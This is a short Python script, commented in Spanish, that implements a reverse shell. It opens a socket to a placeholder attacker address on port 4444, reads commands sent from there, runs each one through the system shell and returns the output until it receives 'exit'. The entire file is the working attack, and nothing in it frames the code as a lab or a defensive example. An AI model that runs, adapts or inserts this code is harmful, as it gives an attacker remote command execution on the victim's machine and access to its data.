import socket
import subprocess

def run():
    # Crea un socket para la conexión de reverse shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("atacker_ip", 4444))

    # Lee comandos del atacante y los ejecuta en la máquina objetivo
    while True:
        command = s.recv(1024).decode()
        if command == "exit":
            break
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode()
        s.send(output.encode())

    # Cierra la conexión de reverse shell
    s.close()
